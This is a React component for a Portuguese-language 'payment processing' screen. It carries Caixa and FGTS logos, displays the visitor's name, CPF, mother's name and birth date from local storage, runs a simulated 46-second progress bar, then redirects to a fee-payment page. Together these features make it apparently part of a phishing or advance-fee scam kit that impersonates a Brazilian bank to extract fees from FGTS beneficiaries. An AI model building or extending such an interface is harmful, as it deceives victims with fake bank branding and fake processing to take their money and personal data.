import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import logo from "../assets/caixalogo.png";
import Vimeo from '@u-wave/react-vimeo';
import logofgts from "../assets/fgts2.png";

import { FaAngleRight } from "react-icons/fa";
import { UserData } from "../types/userData";
import dayjs from "dayjs";


// Payment processing screen with dynamic progress
export function ProcessandoPagamento() {
    const [progress, setProgress] = useState(0);
    const navigate = useNavigate();

    // <script src="https://player.vimeo.com/api/player.js"></script>

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        nomeMae: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    // Load user data from localStorage on component mount
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    // Simulate a 30-second progress bar
    useEffect(() => {
        const duration = 46000;
        const start = Date.now();

        const updateProgress = () => {
            const elapsed = Date.now() - start;
            const newProgress = Math.min((elapsed / duration) * 100, 100);
            setProgress(newProgress);

            if (newProgress < 100) {
                requestAnimationFrame(updateProgress);
            } else {
                navigate("/pagamentotarifa");
            }
        };

        updateProgress();
    }, [navigate]);

    return (
        <div className="w-screen h-full flex flex-col items-center text-white bg-[#025bab]">
            {/* Header with logo and user name */}
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="rounded-lg bg-primary text-white mt-2">
                <div className="rounded-lg space-y-10">
                    <div className="flex items-center space-x-2">
                        <div className="bg-orange-400 p-2 rounded-full w-fit">
                            <FaAngleRight size={20} color="white" />
                        </div>
                        <h2 className="font-bold text-2xl">
                            Processando pagamento...
                        </h2>
                    </div>

                    <div className="font-bold text-xl flex flex-col px-4 space-y-2">
                        <div className="flex items-center justify-between">
                            <h3>{userData.nome.toUpperCase()}</h3>
                            <FaAngleRight />
                        </div>
                        {userData?.nomeMae && (
                            <span className="font-thin text-zinc-300">Nome da mãe: {userData?.nomeMae}</span>
                        )}
                        <span className="font-thin text-zinc-300">CPF: {userData?.cpf}</span>
                        <span className="font-thin text-zinc-300">Nascimento: {dayjs(userData?.dataNascimento).format("DD/MM/YYYY")}</span>
                    </div>
                    <span className="border-b border-b-zinc-800 my-2" />
                </div>
            </div>

            {/* Progress bar */}
            <div className="w-3/4 bg-gray-300 rounded-full h-4 mt-6">
                <div
                    className="bg-orange-500 h-4 rounded-full transition-all ease-linear"
                    style={{ width: `${progress}%` }}
                />
            </div>
            <span className="text-sm text-zinc-200 mt-2">{Math.floor(progress)}% concluído</span>

            <div className="py-6">
                <Vimeo
                    video="1032180388"
                    autoplay
                />
            </div>



            {/* Waiting message */}
            <div className="text-center mt-8 px-4 mb-8">
                <h2 className="text-lg text-zinc-300">Aguarde enquanto processamos seu pagamento...</h2>
                <p className="text-sm text-zinc-400">Estamos finalizando seu pedido. Isso pode levar alguns instantes.</p>
            </div>
        </div>
    );
}
